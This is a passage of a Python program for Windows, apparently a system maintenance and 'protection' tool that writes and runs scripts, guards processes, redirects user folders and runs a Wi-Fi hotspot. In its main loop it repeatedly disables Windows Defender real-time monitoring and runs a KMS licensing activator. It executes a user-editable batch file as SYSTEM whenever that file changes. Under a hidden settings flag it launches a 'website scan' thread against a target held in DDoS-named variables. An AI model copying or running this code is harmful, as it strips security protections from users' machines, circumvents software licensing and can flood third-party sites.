            + "echo 执行检查，请稍候 & sfc /scannow & DISM /Online /Cleanup-Image /ScanHealth & DISM /Online /Cleanup-image /RestoreHealth & DISM /online /Cleanup-Image /StartComponentCleanup"
            + chr(10)
            + "cls & echo 执行清理，请稍候"
            + chr(10)
            + CCleanerExe
            + " /AUTO"
            + chr(10)
            + "cls & echo 执行优化，请稍候"
            + chr(10)
            + "start /min /wait cmd /c "
            + chr(34)
            + ProtectBAT
            + chr(34)
            + "<"
            + AutoAnswer
            + chr(10)
            + "cls & echo 完成"
            + chr(10)
            + 'start mshta vbscript:Msgbox("维护清理完成")(window.close)'
        )
        # 在每个文件中加入中文，文本不包含中文时，编码无法使用GBK格式，会被保存为utf-8
        AllCommands += chr(10) + "rem GBK中文编码支持"  # 批处理注释使用rem
        create_script(AllRunCommand, AllCommands)
        AllSchrun += chr(10) + "rem GBK中文编码支持"
        create_script(AllSchrunBA, AllSchrun)
        BatComA += chr(10) + "rem GBK中文编码支持"
        create_script(ProtectBAT, BatComA)
        WifiShareStart += chr(10) + "#GBK中文编码支持"  # powershell注释使用#
        create_script(ProtectWifi, WifiShareStart)
        ProtectKeeperBAT += chr(10) + "'GBK中文编码支持"  # vbs注释使用'
        create_script(ProtectKeeper, ProtectKeeperBAT)
        BATRUNVBS += chr(10) + "'GBK中文编码支持"
        create_script(BATKEEPER, BATRUNVBS)
        Uninstaller += chr(10) + "rem GBK中文编码支持"
        create_script(UNINST, Uninstaller)
        USBWrite += chr(10) + "rem GBK中文编码支持"
        create_script(UsbChanger, USBWrite)
        VBAllRun += chr(10) + "'GBK中文编码支持"
        create_script(VBAllRunF, VBAllRun)
        regfix += chr(10) + ";GBK中文编码支持"  # reg包括regini注释使用;
        create_script(regfixfile, regfix)
        create_script(ncsi, "Microsoft NCSI联网测试")
        regstartupvb += chr(10) + "'GBK中文编码支持"
        create_script(regstartup, regstartupvb)
        regini += chr(10) + ";GBK中文编码支持"
        create_script(reginifile, regini)
        systemappfixpow += chr(10) + "#GBK中文编码支持"
        create_script(systemappfix, systemappfixpow)
        MainTainCleanBat += chr(10) + "rem GBK中文编码支持"
        create_script(MainTainClean, MainTainCleanBat)
        ErrorAutoFixBat_text += chr(10) + "rem GBK中文编码支持"
        create_script(ErrorAutoFix, ErrorAutoFixBat_text)
        create_script(ErrorAutoFixXml, ErrorAutoFixXml_text)
        with open(StopWifiShare, "w") as f:
            f.write(StopWifiShareps)

        if (os.path.isfile(randomwifissid) or os.path.isfile(randomwifipwd)) and (
            os.path.isfile(openwifi) or hidesettingflag == "1"
        ):
            try:
                for i in get_logon_user():
                    try:
                        i = "-" + i
                        with open(
                            datadir
                            + ":\\StorageRedirect\\Desktop"
                            + i
                            + "\\随机无线局域网信息.txt",
                            "w",
                        ) as f:
                            f.write(random_wifi_conf)
                    except Exception as e:
                        log(
                            logs,
                            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                        )
            except Exception as e:
                log(
                    logs,
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )
            os.popen("powershell " + StopWifiShare)
            random_WiFi_msg = (
                'cmd /c start mshta vbscript:Msgbox(\\"'
                + random_wifi_conf.replace("\n", '\\"+chr(10)+\\"')
                + '\\",4096,\\"随机无线局域网热点\\")(window.close)'
            )
            runas("users", random_WiFi_msg)
            log(logs, random_wifi_conf)

        if os.path.isfile(openwifi) or hidesettingflag == "1":
            clock_show_info("热点:" + wifiid, "密码:" + wifipw)
        else:
            clock_show_info()
        try:
            with open(AutoAnswer, "w", encoding="GBK") as f:
                f.write("y" * 1314520)
        except Exception as e:
            log(
                logs,
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
        log(logs, "定义阶段成功完成")
        if not selffullname == ProtectExe or not os.path.isfile(ProtectExe) or qinstall:
            if not os.path.exists:
                os.mkdir(ProtectDir)
            # 配置脚本写入完成，配置系统设置
            os.popen("cmd " + ProtectSchTask)
            os.popen("wscript " + VBAllRunF)
            os.popen("cmd /c " + AllRunCommand + "<" + AutoAnswer)
            os.popen("cmd /c " + Regset)
            os.popen(
                'cmd /c reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment" /t REG_EXPAND_GZ /v Path /d "%path%;'
                + ProtectDir
                + '" /f'
            )
            os.popen("cmd /c " + AllSchrunBA)
            os.popen("cmd /c " + autochangepreD)
            os.popen("cmd /c " + chr(34) + ProtectBAT + chr(34) + "<" + AutoAnswer)
            UserBackTell1 = True
            selfmd5 = getmd5(selffullname)
            promd5 = getmd5(ProtectExe)
            UserBackTell1 = False
            if selfmd5 == promd5:
                os.popen('"' + ProtectExe + '" -h')
                if os.path.isfile(ProtectControl):
                    os.startfile(ProtectControl)
                if not qinstall:
                    UserBackTell1 = messagebox.askyesnocancel(
                        "完成",
                        "安装完毕"
                        + chr(10)
                        + "您后续可通过 "
                        + ProtectControl
                        + " 修改配置"
                        + chr(10)
                        + "请重启计算机来完成应用，是否立即重启？"
                        + chr(10)
                        + "md5校验值："
                        + str(promd5),
                    )
            else:
                messagebox.showerror(
                    "失败",
                    "安装失败：md5校验未通过："
                    + chr(10)
                    + "安装程序md5:"
                    + str(selfmd5)
                    + chr(10)
                    + "错误的md5:"
                    + str(promd5),
                )
                os._exit(0)
            if UserBackTell1 or qinstall:
                os.popen("cmd /c shutdown -r -t 15")
            os._exit(0)
    except Exception as e:
        log(
            logs,
            "抛出错误在定义阶段" + str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )
        os._exit(0)
    return True


def pope():
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, lowlog, proname0, tdir0, proname1, tdir1, tdir2, datadir, Onedriveupdatedir, autoshutdowntime, pronamesys, AllSchrun, AppRunA, AppRunB, AppRunC, Onedriveupdate, logs, ztimeoutA, ztimeoutB, hidesettingflag, SystemVersion
    try:
        log(logs, "程序初始化完成，开始运行")
        os.popen("cmd /c " + AllRunCommand + "<" + AutoAnswer)
    except Exception as e:
        log(
            logs,
            "抛出错误在运行AllRunCommands阶段"
            + str(sys.exc_info())
            + "行:"
            + str(e.__traceback__.tb_lineno),
        )
    return True


def application():
    global qinstall, DDOSurl, DDOSip, DDOSflag, DDOSConf, lowlog, proname0, tdir0, proname1, tdir1, tdir2, datadir, Onedriveupdatedir, autoshutdowntime, pronamesys, AllSchrun, AppRunA, AppRunB, AppRunC, Onedriveupdate, logs, ztimeoutA, ztimeoutB, hidesettingflag, SystemVersion
    WhileNum = 0
    ztimeoutA = 0
    ztimeoutB = 1800
    ztimeoutC = 120
    try:
        if hidesettingflag == "1" and not DDOSConf == "Disable":
            log(logs, "启动网站扫描 %s" % DDOSConf)
            threading.Thread(
                target=Zhang_lan_scan.scan,
                args=(
                    1,
                    random.randrange(2, 100),
                    DDOSConf,
                    "http",
                    "scan_result.txt",
                    random.randrange(1, 11),
                ),
            ).start()
    except Exception as e:
        log(
            logs,
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )
    now_time_a = str(datetime.date.today())
    AutoRunCommand = datadir + ":\\Files\\AutoCommand"
    AutoRunCommandBat = AutoRunCommand + "\\AutoCommand.bat"
    try:
        with open(AutoRunCommandBat, "r", encoding="gbk") as f:
            Auto_run_bat_A = f.read()

    except Exception as e:
        log(
            logs,
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )
    logon_new_user_A = len(get_logon_user())
    while True:
        global wifiid, wifipw
        try:
            now_time_b = str(datetime.date.today())
            try:
                with open(AutoRunCommandBat, "r", encoding="gbk") as f:
                    Auto_run_bat_B = f.read()
                if not Auto_run_bat_B == Auto_run_bat_A:
                    Auto_run_bat_A = Auto_run_bat_B
                    runas("SYSTEM", "cmd /c " + AutoRunCommandBat + "<" + AutoAnswer)
                    os.popen("cmd /c " + AutoRunCommandBat + "<" + AutoAnswer)
                    log(logs, "自动脚本被修改，已自动运行")
            except Exception as e:
                Auto_run_bat_A = 0
            if not now_time_a == now_time_b:
                now_time_a = now_time_b
                # 这里往下执行每天的内容，每天运行一次，适合长时间运行本程序情况下跨日执行
                if hidesettingflag == "1" or os.path.isfile(Open_SystemBackup_Flag):
                    System_Backup_Pro = threading.Thread(
                        target=System_Backup, args=(datadir,)
                    )
                    System_Backup_Pro.start()
                    log(logs, "根据策略设置，创建自动备份线程，日期：" + now_time_b)
            WhileNum += 1
            ztimeoutA += 1
            ztimeoutB += 1
            ztimeoutC += 1
            logon_new_user_B = len(get_logon_user())
            if logon_new_user_A == logon_new_user_B:  # 新用户登录后或用户注销，暂停30秒
                TaskKeep(proname0, tdir0, True)
                TaskKeep(proname1, tdir1, True)
                TaskKeep(
                    "memreduct.exe", chr(34) + memreduct + chr(34) + " /minimized", True
                )
                TaskKeep(
                    "desktopok.exe",
                    chr(34) + DesktopOK + chr(34) + " -bg -startup",
                    True,
                )
                if not os.path.isfile(Disable_sys_dispatch):
                    TaskKeep(
                        "SysDispatch.exe", chr(34) + ProtectSysDispatch + chr(34), True
                    )
                global ap_360_exe
                if hidesettingflag == "1" or os.path.isfile(openwifi):
                    if os.path.isfile(ap_360_exe):
                        if not os.path.isfile(closewifi):
                            ap_restart_flag = 0
                            if get_process_num("360AP.exe") < 2:
                                ap_restart_flag = 1
                                os.popen("Taskkill /f /im 360AP.exe /t").read()
                                log(
                                    logs,
                                    "360AP进程异常，已结束残留进程%s,%s"
                                    % (
                                        get_process_num("360AP.exe"),
                                        get_pro_user_num("360AP.exe"),
                                    ),
                                )
                            for i in get_logon_user():
                                i = str(i)
                                userpro = datadir + ":\\StorageRedirect\\AppData-" + i
                                ap_profile = userpro + "\\360AP\\config.ini"
                                if os.path.isfile(ap_profile):
                                    try:
                                        with open(ap_profile, "r", encoding="gbk") as f:
                                            old_ap_ini = f.read()
                                            new_ap_ini = ""
                                    except Exception as e:
                                        try:
                                            with open(
                                                ap_profile, "r", encoding="utf-8"
                                            ) as f:
                                                old_ap_ini = f.read()
                                                new_ap_ini = ""
                                        except Exception as e:
                                            try:
                                                with open(ap_profile, "r") as f:
                                                    old_ap_ini = f.read()
                                                    new_ap_ini = ""
                                            except Exception as e:
                                                log(
                                                    logs,
                                                    str(sys.exc_info())
                                                    + "行:"
                                                    + str(e.__traceback__.tb_lineno),
                                                )
                                    try:
                                        for j in old_ap_ini.splitlines():
                                            if "=" in j:
                                                if j.split("=")[0] == "schoolhook":
                                                    j = "schoolhook=1"
                                                if (
                                                    j.split("=")[0]
                                                    == "main_banner_showclosebtn"
                                                ):
                                                    j = "main_banner_showclosebtn=0"
                                                if j.split("=")[0] == "dns_check":
                                                    j = "dns_check=1"
                                                if j.split("=")[0] == "m_bro_hj_opt":
                                                    j = "m_bro_hj_opt=1"
                                                if j.split("=")[0] == "wifistub":
                                                    j = "wifistub=1"
                                                if j.split("=")[0] == "freessid":
                                                    j = "freessid=" + wifiid
                                                if j.split("=")[0] == "schoolhook":
                                                    j = "schoolhook=1"
                                                if j.split("=")[0] == "freepwd":
                                                    pass
                                                if (
                                                    j.split("=")[0]
                                                    == "autorun_start_free_wifi"
                                                ):
                                                    j = "autorun_start_free_wifi=0"
                                                if (
                                                    j.split("=")[0]
                                                    == "dnshremind_popup"
                                                ):
                                                    j = "dnshremind_popup=0"
                                                if j.split("=")[0] == "CreateWifi":
                                                    j = "CreateWifi=1"
                                                if j.split("=")[0] == "NoConnectWiFi":
                                                    j = "NoConnectWiFi=0"
                                                if j.split("=")[0] == "ShowTray":
                                                    j = "ShowTray=0"
                                                if j.split("=")[0] == "safe_dns":
                                                    j = "safe_dns=0"
                                                if j.split("=")[0] == "WhiteJoinNotify":
                                                    j = "WhiteJoinNotify=0"
                                                if j.split("=")[0] == "closeprotalpage":
                                                    j = "closeprotalpage=1"
                                                if j.split("=")[0] == "new_feture":
                                                    j = "new_feture=0"
                                                if (
                                                    j.split("=")[0]
                                                    == "has_desktop_shortcut"
                                                ):
                                                    j = "has_desktop_shortcut=1"
                                            new_ap_ini += j + chr(10)
                                        with open(ap_profile, "w", encoding="gbk") as f:
                                            f.write(new_ap_ini)
                                    except Exception as e:
                                        log(
                                            logs,
                                            str(sys.exc_info())
                                            + "行:"
                                            + str(e.__traceback__.tb_lineno),
                                        )

                            if not get_pro_stat("360AP.exe") or ap_restart_flag == 1:
                                ap_restart_flag = 0
                                ap_user = get_logon_user()[0]
                                os.popen("powershell %s" % StopWifiShare)
                                runas(
                                    ap_user,
                                    chr(34)
                                    + ap_360_exe
                                    + chr(34)
                                    + " /menufree /school",
                                )
                                log(logs, "360AP重新启动中:%s" % ap_user)
                                ap_timeout = 0
                                while (
                                    ap_timeout < 10 and get_process_num("360AP.exe") < 2
                                ):
                                    time.sleep(3)
                                    ap_timeout += 1
                                    log(logs, "等待360AP运行")
                    else:
                        ap_360_repair()
                if os.path.isfile(more_keep_process):
                    more_keep = ""
                    with open(more_keep_process, "r") as f:
                        more_keep = f.read().splitlines()
                    more_keep_list = []
                    for i in more_keep:
                        if "*" in i and not i[0] == "#" and len(i.split("*")) == 2:
                            more_keep_list.append(i)
                    try:
                        for i in more_keep_list:
                            more_keep_info = i.split("*")
                            TaskKeep(more_keep_info[0], more_keep_info[1], True)
                    except Exception as e:
                        log(
                            logs,
                            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                        )
                else:
                    with open(more_keep_process, "w", encoding="gbk") as f:
                        f.write("#您可在此文件定义更多进程守护，井号开头注视\r\n#格式: 进程名*启动命令 ,一行一个")
            else:
                logon_new_user_A = logon_new_user_B
                time.sleep(10)
            if os.path.exists(datadir + ":"):
                KeepFolder(datadir + ":\\Files")
                KeepFolder(datadir + ":\\Important")
                KeepFolder(datadir + ":\\Important\\System_Backup")
                Driver_Backup_Path = (
                    datadir + ":\\Important\\System_Backup\\Drivers_Backup"
                )
                KeepFolder(Driver_Backup_Path)
                KeepFolder(datadir + ":\\StorageRedirect")
                KeepFolder(datadir + ":\\StorageRedirect\\Program")
                KeepFolder(datadir + ":\\StorageRedirect\\Wlansvc")
                KeepFolder(datadir + ":\\StorageRedirect\\【请勿删除或更改】这些文件夹由程序自动重定向生成")
                KeepFolder(datadir + ":\\StorageRedirect\\【请勿删除或更改】固定文件夹无法删除-可新建其他文件夹")
                for i in get_logon_user():
                    time.sleep(0.001)
                    i = "-" + i
                    KeepFolder(datadir + ":\\StorageRedirect\\Netease" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\KuGou" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\KuGou8" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\Edge" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\clash" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\VMware" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\Tencent" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\OneDrive" + i)
                    KeepFolder(
                        datadir + ":\\StorageRedirect\\upupoo-wallpaper-shop" + i
                    )
                    KeepFolder(datadir + ":\\StorageRedirect\\Desktop" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\Download" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\Documents" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\Music" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\Videos" + i)
                    KeepFolder(datadir + ":\\StorageRedirect\\Pictures" + i)
                if hidesettingflag == "1":
                    KeepFolder(datadir + ":\\学科文件夹")
                    KeepFolder(datadir + ":\\学科文件夹\\语文")
                    KeepFolder(datadir + ":\\学科文件夹\\数学")
                    KeepFolder(datadir + ":\\学科文件夹\\外语")
                    KeepFolder(datadir + ":\\学科文件夹\\物理")
                    KeepFolder(datadir + ":\\学科文件夹\\化学")
                    KeepFolder(datadir + ":\\学科文件夹\\生物")
                    KeepFolder(datadir + ":\\学科文件夹\\历史")
                    KeepFolder(datadir + ":\\学科文件夹\\政治")
                    KeepFolder(datadir + ":\\学科文件夹\\地理")
                    KeepFolder(datadir + ":\\学科文件夹\\其他")
                    KeepFolder(datadir + ":\\学科文件夹\\【请勿删除或更改】这些文件夹由程序自动生成-自动部分以普通中学为标准")
                    KeepFolder(datadir + ":\\学科文件夹\\【请勿删除或更改】固定文件夹无法删除-可新建其他文件夹")
                    hidexk = datadir + ":\\学科文件夹\\隐藏此文件夹.bat"
                    showxk = datadir + ":\\学科文件夹\\显示此文件夹.bat"
                    with open(hidexk, "w", encoding="gbk") as f:
                        f.write(
                            "cd %~dp0 & echo 1 > hide & cls & echo 完成，下一次启动时或手动设置一次隐藏生效 & timeout /t 3"
                        )
                    with open(showxk, "w", encoding="gbk") as f:
                        f.write(
                            "cd %~dp0 & del /f /q hide & cls & echo 完成，下一次启动时或手动取消一次隐藏生效 & timeout /t 3"
                        )
                else:
                    try:
                        size = 0
                        Folderpath = datadir + ":\\学科文件夹"
                        for path, dirs, files in os.walk(Folderpath):
                            for f in files:
                                fp = os.path.join(path, f)
                                size += os.path.getsize(fp)
                        if size <= 100:
                            shutil.rmtree(Folderpath)
                    except Exception as e:
                        log(
                            logs,
                            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                        )

            Disable_System_Backup_Bat = (
                datadir + ":\\Important\\System_Backup\\禁用自动备份.bat"
            )
            Enable_System_Backup_Bat = (
                datadir + ":\\Important\\System_Backup\\启用自动备份.bat"
            )
            Restore_System_Backup_Bat = (
                datadir + ":\\Important\\System_Backup\\还原驱动备份.bat"
            )
            Create_Append_System_Backup_Bat = (
                datadir + ":\\Important\\System_Backup\\创建差异备份.bat"
            )
            if not os.path.isfile(Disable_System_Backup_Bat):
                with open(Disable_System_Backup_Bat, "w") as f:
                    f.write(
                        "cd %~dp0 & echo 1 > nobackup & cls & echo 完成，下一次启动时生效 & timeout /t 3"
                    )
            if not os.path.isfile(Enable_System_Backup_Bat):
                with open(Enable_System_Backup_Bat, "w") as f:
                    f.write(
                        "cd %~dp0 & del /f /q nobackup & cls & echo 完成，下一次启动时生效 & timeout /t 3"
                    )
            if not os.path.isfile(Create_Append_System_Backup_Bat):
                with open(Create_Append_System_Backup_Bat, "w") as f:
                    f.write(
                        "cd %~dp0 & echo 1 > newbackup & cls & echo 完成，下一次启动时生效 & timeout /t 3"
                    )
            Restore_Driver_Bat = (
                'echo 防止误触，按任意键继续 & pause & Dism /online /Add-Driver /Driver:"'
                + datadir
                + ":\\Important\\System_Backup\\Drivers_Backup"
                + '" /Recurse  & timeout /t 3'
            )
            if not os.path.isfile(Restore_System_Backup_Bat):
                with open(Restore_System_Backup_Bat, "w") as f:
                    f.write(Restore_Driver_Bat)
            if hidesettingflag == "1":
                if not os.path.exists(Onedriveupdatedir):  # OneDrive的同步目录是否存在
                    OneDriveFlag = False
                else:
                    OneDriveFlag = True

                if (ztimeoutA in range(0, 30)) and OneDriveFlag:
                    if os.path.isfile(Onedriveupdate):
                        os.remove(Onedriveupdate)
                        log(logs, "移除同步诱导文件")
                else:
                    if OneDriveFlag:
                        if not os.path.isfile(Onedriveupdate):
                            with open(Onedriveupdate, "w") as f:
                                f.write(
                                    str(datetime.datetime.now()) + "此文件为OneDrive同步文件"
                                )
                            log(logs, "创建同步诱导文件")
                        if ztimeoutA >= 60:
                            ztimeoutA = 0
            KeepFolder(AutoRunCommand)
            if not os.path.isfile(AutoRunCommandBat):
                with open(AutoRunCommandBat, "w+", encoding="gbk") as f:
                    f.write(
                        "@echo off\ncd %~dp0\nrem 在此批处理文件中输入自定义命令，ZhangProtect将自动运行此批处理（管理员），将以Y回答所有问题"
                    )
            if ztimeoutB >= 1800:
                ztimeoutB = 0
                os.popen("cmd /c " + AppRunC)
                os.popen("Taskkill /f /im NSudo.exe /t")
                os.popen("Taskkill /f /im DesktopOK.exe /t")
                runas("users", CCleanerExe + " /AUTO")
                runas("SYSTEM", "cmd /c " + AutoRunCommandBat + "<" + AutoAnswer)
                os.popen("cmd /c " + AutoRunCommandBat + "<" + AutoAnswer)
                kill_exe(KMSActivatorExe)
                os.popen(KMSActivatorExe + " /smart /nologo")
                log(logs, "用户延迟循环任务运行成功")
            if ztimeoutC >= 120:
                ztimeoutC = 0
                os.popen(ProtectBAT + "<" + AutoAnswer)
                if os.path.isfile(openwifi) or hidesettingflag == "1":
                    clock_show_info("热点:" + wifiid, "密码:" + wifipw)
                else:
                    clock_show_info()
                if os.path.isfile(ikun_icon_flag):
                    date_now = str(int(datetime.datetime.now().weekday()) + 1)
                    fullpath = os.path.abspath(ikun_icon_dir + "\\%s.ico" % date_now)
                    os.popen(
                        'for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DriveIcons\\%i\\DefaultIcon /d "'
                        + fullpath
                        + '" /f)'
                    ).read()
            os.popen("powershell " + ProtectWifi)
            if not os.path.isfile(ikun_wav_file):
                b64_to_file(ikun_wav_file, ikun_wav)
            os.popen(
                'for %k in (1 2 3) do (for /f "delims=" %i in (\'dir /B /A '
                + datadir
                + ":\\"
                + "') do (attrib +s "
                + datadir
                + ":\\%i))"
            )
            os.popen(
                'for %k in (1 2 3) do (for /f "delims=" %i in (\'dir /B /A '
                + datadir
                + ":\\"
                + "') do (attrib +s +r +h "
                + datadir
                + ":\\%i\\desktop.ini))"
            )
            set_environment_path(ProtectDir)
            set_environment_path(RDPWrapDir)
            set_environment_path(CCleanerDir)
            set_environment_path(SnapShotDir)
            set_environment_path(nmyu_dir)
            Desktop_Defaut_ini = """[DesktopOK]
            m_lang_id=6
            m_usertext=桌面布局
            use_new_strategy=0
            metrice_mode_icon=0
            at_program_exit_save=0
            at_program_start_restore=1
            auto_at_program_exit_save=0
            use_explorer_feature=1
            m_explorer_enable_lines=1
            m_explorer_disable_expando=0
            m_explorer_indent=0
            m_explorer_disable_fadeout=0
            desktop_to_foreground_r=0
            desktop_to_foreground_l=0
            desktop_to_foreground_w=0
            screen_shot_in_tray=0
            the_drag_key=0
            m_confim_del=1
            use_alt_rmouse=0
            use_auto_window_minimize=0
            use_auto_window_minimize_sec=1200
            auto_update_time=0
            m_copy_move_jobs=1
            desktop_to_foreground_no_wheel=0
            kalendar_in_tray=0
            m_save_win_rc=0
            disable_at_ctrl_alt_strg=1
            auto_disable_autoarange=1
            soft_paint=1
            disable_dark_theme=1
            savemode=3
            save_icon_spacing=1
            save_icon_size=1
            ignoring_min=1
            only_changes=1
            autosave=0
            autosave_mode=1
            last_t=0
            autosave_keep=0
            by_startup=0
            start_totray=1
            by_shutdown=0
            keep_sort=0
            sort_col=-1
            sort_des=0
            to_tray_if_close=1
            autosave_start=0
            autosave_shutdown=0
            dok_use_resolution=1
            dok_use_date=1
            dok_use_time=1
            dok_use_reverse_date=1
            OVERWRITE_PROMPT=0
            auto_hide_icons_sec=15
            auto_hide_cursor_sec=5
            use_auto_hide_cursor=1
            show_icons_by_l_mouse=1
            show_icons_by_r_mouse=1
            show_icons_by_m_mouse=1
            show_icons_mouse_move=1
            use_auto_hide_icons=0
            use_to_tray_by_close=1
            use_screenschottor=1
            use_url_cnt=0
            hide_taskbar=0
            for_startup=桌面布局
            last_dok_folder=
            use_user_name=0
            use_host_name=0
            use_os_version=0
            use_always_mouse_wheel=1
            use_always_mouse_wheel_focus=0
            use_task_volmouse=0
            show_soundvol=0
            use_lmouse_drag=0
            use_alt_f4=0
            use_rmouse_resize=1
            poweroptions_in_tray=0
            use_screen_shot_feature=0
            screenshot_create_base64=0
            screenshot_sound=0
            cpu_usage_in_tray=0
            mem_usage_in_tray=0
            getpixel_in_tray=0
            disable_in_metro_mode=1
            disable_at_right=1
            disable_at_left=1
            use_left_right_scrool_at_SHIFT=0
            hidden_when_you_press_an_key_on_the_keyboard=0
            save_desktop_switch_user=1
            save_windows_switch_user=1
            auto_update_domain=0
            """.replace(
                " ", ""
            )
            for i in get_logon_user():
                i = "-" + i
                Desktop_data = (
                    datadir + ":\\StorageRedirect\\AppData" + i + "\\DesktopOK"
                )
                Desktop_ini = Desktop_data + "\\DesktopOK.ini"
                KeepFolder(datadir + ":\\StorageRedirect\\AppData" + i)
                KeepFolder(Desktop_data)
                try:
                    if os.path.isfile(Desktop_ini):
                        try:
                            with open(Desktop_ini, "r", encoding="gbk") as f:
                                DesktopOK_ini_r = f.read()
                        except Exception as e:
                            try:
                                with open(Desktop_ini, "r") as f:
                                    DesktopOK_ini_r = f.read()
                            except Exception as e:
                                try:
                                    with open(Desktop_ini, "r", encoding="utf-16") as f:
                                        DesktopOK_ini_r = f.read()
                                except Exception as e:
                                    log(
                                        logs,
                                        str(sys.exc_info())
                                        + "行:"
                                        + str(e.__traceback__.tb_lineno),
                                    )
                        if not Desktop_Defaut_ini in DesktopOK_ini_r:
                            DesktopOK_ini_r = DesktopOK_ini_r.splitlines()
                            DesktopOK_ini_w = ""
                            for i in DesktopOK_ini_r:
                                if not i == "[DesktopOK]":
                                    if ":Zeit=" in i:
                                        DesktopOK_ini_w += (
                                            chr(10)
                                            + ":Zeit=5200/01/31 5:20:13|5201314000"
                                        )
                                    else:
                                        DesktopOK_ini_w += chr(10) + str(i)
                                else:
                                    DesktopOK_ini_w += chr(10) + Desktop_Defaut_ini
                                    break
                            with open(Desktop_ini, "w", encoding="gbk") as f:
                                f.write(DesktopOK_ini_w)
                    else:
                        with open(Desktop_ini, "w", encoding="gbk") as f:
                            f.write(Desktop_Defaut_ini)
                except Exception as e:
                    log(
                        logs,
                        "抛出错误在DesktopOK配置"
                        + str(sys.exc_info())
                        + "行:"
                        + str(e.__traceback__.tb_lineno),
                    )
            # 电源自动调整
            power_info = get_power_info()
            if not os.path.isfile(donotautopower):  # 自动调整开启时
                if (
                    power_info.get("ACLineStatus") == 1  # 电源接通时
                    or power_info.get("BatteryFlag") == 128  # 没电池的机器
                ):  # 充电器插着的状态
                    if os.path.isfile(powerkeep):
                        os.remove(powerkeep)
                    power_performance()
                else:
                    if not os.path.isfile(powerkeep):
                        with open(powerkeep, "w") as f:
                            f.write("1")
                    power_save()
            else:  # 自动调整关闭时
                if not os.path.isfile(powerkeep):  # 没有开启全力省电时
                    if hidesettingflag == "1":
                        power_performance()
                    else:
                        power_normal()
                else:  # 开启全力省电时
                    power_save()
            if os.path.isfile("Disable_Windows_defender.bat"):
                os.popen("cmd /c Disable_Windows_defender.bat").read()
            else:
                disable_windows_defender()
            os.popen(
                "powershell.exe -command "
                + chr(34)
                + "Set-MpPreference -DisableRealtimeMonitoring $true"
                + chr(34)
            ).read()
            if os.path.isfile(hide_restart):
                os.popen(
                    "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start /t reg_dword /v HideRestart /d 1 /f"
                )
            else:
                os.popen(
                    "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start /t reg_dword /v HideRestart /d 0 /f"
                )

            if os.path.isfile(hide_sleep):
                os.popen(
                    "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start /t reg_dword /v HideSleep /d 1 /f"
                )
            else:
                os.popen(
                    "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start /t reg_dword /v HideSleep /d 0 /f"
                )

            if os.path.isfile(hide_hibernate):
                os.popen(
                    "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start /t reg_dword /v HideHibernate /d 1 /f"
                )
            else:
                os.popen(
                    "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start /t reg_dword /v HideHibernate /d 0 /f"
                )

            if os.path.isfile(hide_shutdown):
                os.popen(
                    "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start /t reg_dword /v HideShutDown /d 1 /f"
                )
            else:
                os.popen(
                    "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Start /t reg_dword /v HideShutDown /d 0 /f"
                )
            gpupdate()
            log(
                logs,
                "第 " + str(WhileNum) + " 次循环正常，您可通过创建文件" + lowlog + "来关闭日志",
            )
            # 好啦，到这里结束了~
        except Exception as e:
            log(
                logs,
                "抛出错误在循环阶段，将重新运行该部分"
                + str(sys.exc_info())
                + "行:"
                + str(e.__traceback__.tb_lineno),
            )
        time.sleep(1)


def main():
    while True:
        try:
            returnflag = readini()
            if returnflag == "reload":
                raise exception("reload")
            if not qinstall:
                flagtest()
            defind()
            pope()
            while True:
                application()
                time.sleep(1)
        except Exception as e:
            log(
                logs,
                "抛出错误在主函数，将重新运行该部分"
                + str(sys.exc_info())
                + "行:"
                + str(e.__traceback__.tb_lineno),
            )
        time.sleep(1)


if __name__ == "__main__":
    main()
